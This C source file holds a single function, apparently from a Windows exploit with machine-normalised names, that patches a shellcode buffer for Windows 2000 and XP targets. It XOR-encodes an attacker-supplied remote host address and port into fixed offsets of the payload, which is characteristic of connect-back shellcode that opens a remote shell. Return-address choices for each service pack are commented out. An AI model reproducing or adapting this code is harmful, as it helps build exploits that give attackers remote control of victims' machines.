#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 unsigned short FUNC0 (int) ; 
 unsigned int FUNC1 (char*) ; 

void FUNC2(int os, int sp, char *rhost, int rport, char *shellc0de)
{
        unsigned int ip=0;
        unsigned short port=0;
        char *port_to_shell="",*ip1="";

        ip = FUNC1(rhost); ip1 = (char*)&ip;
        shellc0de[325]=ip1[0]^0x95;shellc0de[326]=ip1[1]^0x95;
        shellc0de[327]=ip1[2]^0x95; shellc0de[328]=ip1[3]^0x95;

        port = FUNC0(rport);
        port_to_shell = (char *) &port;
        shellc0de[319]=port_to_shell[0]^0x95;
        shellc0de[320]=port_to_shell[1]^0x95;

switch(os)
{
case 0: // win2k
/*
        switch(sp)
        {
        case 0:
                *(long*)&shellc0de[0]=RET_WIN2K_SP0;
                break;
        case 1:
                *(long*)&shellc0de[0]=RET_WIN2K_SP1;
                break;
        case 2:
                *(long*)&shellc0de[0]=RET_WIN2K_SP2;
                break;
        case 3:
                *(long*)&shellc0de[0]=RET_WIN2K_SP3;
                break;
        case 4:
                *(long*)&shellc0de[0]=RET_WIN2K_SP4;
                break;
        }
*/
        break;
case 1: // winXP
        shellc0de[167]=shellc0de[215]=(unsigned char)0xfe;
        shellc0de[345]=shellc0de[453]=(unsigned char)0xfe;
/*
        switch(sp)
        {
        case 0:
                *(long*)&shellc0de[0]=RET_WINXP_SP0;
                break;
        case 1:
                *(long*)&shellc0de[0]=RET_WINXP_SP1;
                break;
        }
*/
        break;
        }
        return;
}